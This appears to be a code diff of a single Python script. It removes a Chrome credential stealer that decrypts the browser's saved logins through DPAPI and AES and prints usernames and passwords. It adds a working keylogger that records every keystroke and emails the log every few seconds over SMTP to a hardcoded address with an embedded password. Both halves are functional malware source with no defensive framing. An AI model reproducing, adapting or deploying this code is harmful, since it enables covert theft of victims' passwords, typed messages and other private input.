@@ -1,92 +1,78 @@
-import os
-import json
-import base64
-import sqlite3
-import win32crypt
-from Crypto.Cipher import AES
-import shutil
-from datetime import timezone, datetime, timedelta
+import keyboard # for keylogs
+import smtplib # for sending email using SMTP protocol
+from threading import Timer
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
-def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+SEND_REPORT_EVERY = 3 # in seconds
+EMAIL_ADDRESS = "gamesofliander@gmail.com"
+EMAIL_PASSWORD = "mySuperSecretPassword"
 
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-
-    # decode the encryption key from Base64
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    # remove DPAPI str
-    key = key[5:]
-    # return decrypted key that was originally encrypted
-    # using a session key derived from current user's logon credentials
-    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-def decrypt_password(password, key):
-    try:
-        # get the initialization vector
-        iv = password[3:15]
-        password = password[15:]
-        # generate cipher
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        # decrypt password
-        return cipher.decrypt(password)[:-16].decode()
-    except:
-        try:
-            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-        except:
-            # not supported
-            return ""
-
-def main():
-    # get the AES key
-    key = get_encryption_key()
-    # local sqlite Chrome database path
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "default", "Login Data")
-    # copy the file to another location
-    # as the database will be locked if chrome is currently running
-    filename = "ChromeData.db"
-    shutil.copyfile(db_path, filename)
-    # connect to the database
-    db = sqlite3.connect(filename)
-    cursor = db.cursor()
-    # `logins` table has the data we need
-    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-    # iterate over all rows
-    for row in cursor.fetchall():
-        origin_url = row[0]
-        action_url = row[1]
-        username = row[2]
-        password = decrypt_password(row[3], key)
-        date_created = row[4]
-        date_last_used = row[5]        
-        if username or password:
-            print(f"Origin URL: {origin_url}")
-            print(f"Action URL: {action_url}")
-            print(f"Username: {username}")
-            print(f"Password: {password}")
-        else:
-            continue
-        if date_created != 86400000000 and date_created:
-            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
-        if date_last_used != 86400000000 and date_last_used:
-            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
-        print("="*50)
-    cursor.close()
-    db.close()
-    try:
-        # try to remove the copied db file
-        os.remove(filename)
-    except:
-        pass
+class Keylogger:
+   def __init__(self, interval, report_method="email"):
+       self.interval = interval
+       self.report_method = report_method
+       self.log = ""
+       self.start_dt = datetime.now()
+       self.end_dt = datetime.now()
+   def callback(self, event):
+       name = event.name
+       if len(name) > 1:
+           if name == "space":
+               name = " "
+           elif name == "enter":
+               name = "[ENTER]\n"
+           else:
+               name = f"[{name.upper()}]"
+       self.log += name
+   def update_filename(self):
+       start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+       end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+       self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+   def report_to_file(self):
+       with open(f"{self.filename}.txt", "w") as f:
+           print(self.log, file=f)
+       print(f"[+] Saved {self.filename}.txt")
+   def prepare_mail(self, message):
+       msg = MIMEMultipart("alternative")
+       msg["From"] = EMAIL_ADDRESS
+       msg["To"] = EMAIL_ADDRESS
+       msg["Subject"] = "Keylogger logs"
+       html = f"<p>{message}</p>"
+       text_part = MIMEText(message, "plain")
+       html_part = MIMEText(html, "html")
+       msg.attach(text_part)
+       msg.attach(html_part)
+       return msg.as_string()
+   def sendmail(self, email, password, message, verbose=1):
+       server = smtplib.SMTP(host="smtp.office365.com", port=587)
+       server.starttls()
+       server.login(email, password)
+       server.sendmail(email, email, self.prepare_mail(message))
+       server.quit()
+       if verbose:
+           print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
+   def report(self):
+       if self.log:
+           self.end_dt = datetime.now()
+           self.update_filename()
+           if self.report_method == "email":
+               self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+           elif self.report_method == "file":
+               self.report_to_file()
+           self.start_dt = datetime.now()
+       self.log = ""
+       timer = Timer(interval=self.interval, function=self.report)
+       timer.daemon = True
+       timer.start()
+   def start(self):
+       self.start_dt = datetime.now()
+       keyboard.on_release(callback=self.callback)
+       self.report()
+       print(f"{datetime.now()} - Started keylogger")
+       keyboard.wait()
 
 if __name__ == "__main__":
-    main()
+   keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+   keylogger.start()
